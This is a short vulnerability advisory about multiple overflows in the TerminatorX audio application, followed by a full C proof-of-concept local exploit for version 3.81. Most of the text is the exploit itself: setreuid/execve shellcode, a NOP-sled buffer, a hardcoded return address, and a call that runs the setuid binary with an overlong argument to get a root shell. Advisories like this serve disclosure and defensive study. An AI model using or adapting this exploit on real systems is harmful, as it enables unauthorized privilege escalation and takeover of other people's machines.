source: http://www.securityfocus.com/bid/8993/info

It has been reported that TerminatorX may be prone to multiple vulnerabilities when handling command-line and environment variable data. As a result, an attacker may be capable of exploiting the application in a variety of ways to execute arbitrary code with elevated privileges. It should be noted that TerminatorX is not installed setuid by default, however the author recommends that users make the application setuid root.

/* gEEk-terminatorX.c
 *
 * PoC exploit made for advisory based uppon an local stack based overflow.
 * Vulnerable versions, maybe also prior versions:
 *
 * terminatorX v3.81
 *
 * Tested on:  Redhat 9.0
 *
 * Advisory source: c0wboy
 * http://www.0x333.org/advisories/outsiders-terminatorX-001.txt
 *
 * v3.81 uid=0(root) is only gained when compiled with: --enable-suidroot
 *
 * -----------------------------------------
 * coded by: demz (geekz.nl) (demz@geekz.nl)
 * -----------------------------------------
 *
 */

#include <stdio.h>
#include <stdlib.h>

char shellcode[]=

	"\x31\xc0"                      // xor          eax, eax
        "\x31\xdb"                      // xor          ebx, ebx
        "\x31\xc9"                      // xor          ecx, ecx
        "\xb0\x46"                      // mov          al, 70
        "\xcd\x80"                      // int          0x80

        "\x31\xc0"                      // xor          eax, eax
        "\x50"                          // push         eax
        "\x68\x6e\x2f\x73\x68"          // push  long   0x68732f6e
        "\x68\x2f\x2f\x62\x69"          // push  long   0x69622f2f
        "\x89\xe3"                      // mov          ebx, esp
        "\x50"                          // push         eax
        "\x53"                          // push         ebx
        "\x89\xe1"                      // mov          ecx, esp
        "\x99"                          // cdq
        "\xb0\x0b"                      // mov          al, 11
        "\xcd\x80"                      // int          0x80

        "\x31\xc0"                      // xor          eax, eax
        "\xb0\x01"                      // mov          al, 1
        "\xcd\x80";                     // int          0x80

int main()
{
	unsigned long ret = 0xbffff1f0;

	char buffer[4380];
	int i=0;

	memset(buffer, 0x90, sizeof(buffer));

	for (0; i < strlen(shellcode) - 1;i++)
	buffer[2100 + i] = shellcode[i];

	buffer[4380] = (ret & 0x000000ff);
	buffer[4381] = (ret & 0x0000ff00) >> 8;
	buffer[4382] = (ret & 0x00ff0000) >> 16;
	buffer[4383] = (ret & 0xff000000) >> 24;
	buffer[4384] = 0x0;

	printf("\nterminatorX v3.81 local exploit\n");
        printf("---------------------------------------- demz @ geekz.nl --\n");

	execl("/usr/local/bin/terminatorX", "terminatorX", "-r", buffer, NULL);
}
